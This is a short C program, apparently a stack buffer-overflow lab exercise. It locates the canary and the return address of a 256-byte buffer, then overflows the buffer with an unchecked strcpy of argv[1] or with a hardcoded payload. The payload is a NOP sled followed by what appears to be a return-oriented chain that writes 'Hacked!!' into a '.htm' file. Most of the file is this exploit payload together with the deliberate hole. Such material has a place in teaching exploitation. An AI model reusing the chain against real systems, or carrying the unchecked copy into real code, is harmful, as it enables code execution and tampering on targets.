#include <stdio.h>

#define A 0x41

const char default_shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x21\x2d\xf1\xb7\x70\x61\x67\x65\x14\xa0\x04\x08\x1f\xd7\xe4\xb7\x21\x2d\xf1\xb7\x2e\x68\x74\x6d\x18\xa0\x04\x08\x1f\xd7\xe4\xb7\x6e\x39\xe9\xb7\x14\xa0\x04\x08\xb0\x2e\xe5\xb7\x7b\xdf\xe4\xb7\x01\x01\x01\x01\x1c\xa0\x04\x08\xb4\x5f\xea\xb7\x24\x35\xea\xb7\x7b\xdf\xe4\xb7\x02\x02\x02\x02\x30\xa0\x04\x08\xa0\x78\xec\xb7\xb4\x5f\xea\xb7\x62\xd7\xf5\xb7\x14\xa0\x04\x08\x24\x35\xea\xb7\xc0\x78\xec\xb7\x22\x6f\xe4\xb7\xa5\x8d\xed\xb7\x63\xfb\xf3\xb7\x42\xdd\xef\xb7\x21\x2d\xf1\xb7\x48\x61\x63\x6b\x20\xa0\x04\x08\x1f\xd7\xe4\xb7\x21\x2d\xf1\xb7\x65\x64\x21\x21\x24\xa0\x04\x08\x1f\xd7\xe4\xb7\xb0\x2e\xe5\xb7\x7b\xdf\xe4\xb7\x20\xa0\x04\x08\x28\xa0\x04\x08\xb4\x5f\xea\xb7\x24\x35\xea\xb7\xf0\x78\xec\xb7\x22\x6f\xe4\xb7\x63\xfb\xf3\xb7\xc0\x78\xec\xb7\xa5\x8d\xed\xb7\xe0\x78\xec\xb7\xa5\x8d\xed\xb7";

long *return_addr, *canary_h, *canary_l;

int main(int argc, char *argv[]) {

    char buffer[256];
    // the extra 8 is the canary bytes
    return_addr = buffer + 256 + 8 + 4;
    canary_h = buffer + 256;
    canary_l = buffer + 256 + 4;
    memset(buffer, A, sizeof(buffer));
    // To check if shellcode is broken
    printf("\nargc: %d\n\n", argc);
    printf("Contents of return address before buffer overflow: %010p\n\n", *return_addr);
    printf("Canary bytes: %010p %010p\n\n", *canary_h, *canary_l);
    printf("Buffer address: %010p\n\n", buffer);
    printf("Return address: %010p\n\n", return_addr);
    if (argc > 1) {
        strcpy(buffer, argv[1]);
    } else {
        memcpy(buffer, default_shellcode, sizeof(default_shellcode)/sizeof(char));
    }   
    printf("Contents of return address after buffer overflow: %010p\n\n", *return_addr);
        
    return 0;
}